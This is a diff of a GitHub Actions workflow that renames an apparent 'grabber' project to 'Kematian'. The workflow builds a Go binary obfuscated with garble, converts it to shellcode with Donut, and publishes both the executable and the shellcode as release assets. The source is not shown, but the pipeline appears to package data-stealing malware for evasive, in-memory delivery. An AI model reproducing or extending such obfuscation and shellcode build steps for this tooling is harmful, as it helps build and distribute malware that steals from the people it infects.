@@ -1,10 +1,10 @@
-name: Build Grabber
+name: Build Kematian
 
 on:
   push:
     branches: [ main ]
     paths: 
-      - 'grabber-src/**'
+      - 'kematian-src/**'
 
 jobs:
   build:
@@ -31,11 +31,11 @@ jobs:
       run: go install mvdan.cc/garble@latest
 
     - name: Install modules needed
-      working-directory: ./grabber-src
+      working-directory: ./kematian-src
       run: go get github.com/mattn/go-sqlite3 github.com/lxn/win
 
     - name: Build
-      working-directory: ./grabber-src
+      working-directory: ./kematian-src
       run: garble -tiny build .
 
     # Delete-tag-and-release new
@@ -67,8 +67,8 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.github_token }}
       with:
         upload_url: ${{ steps.create_release.outputs.upload_url }}
-        asset_path: grabber-src\grabber.exe
-        asset_name: grabber.exe
+        asset_path: kematian-src\kematian-src.exe
+        asset_name: kematian-src.exe
         asset_content_type: application/zip
 
     - name: Download Donut
@@ -77,8 +77,8 @@ jobs:
     - name: Extract donut
       run: Expand-Archive donut.zip
 
-    - name: Convert Grabber to Shellcode 
-      run: .\donut\donut.exe -i grabber-src\grabber.exe -x2 -a2 -o shellcode.bin -z 4
+    - name: Convert kematian-src to Shellcode 
+      run: .\donut\donut.exe -i kematian-src\kematian-src.exe -x2 -a2 -o kematian.bin -z 4
 
     # Upload Release Asset
     - name: Upload Release Asset
@@ -88,6 +88,6 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.github_token }}
       with:
         upload_url: ${{ steps.create_release.outputs.upload_url }}
-        asset_path: shellcode.bin
-        asset_name: shellcode.bin
+        asset_path: kematian.bin
+        asset_name: kematian.bin
         asset_content_type: application/zip
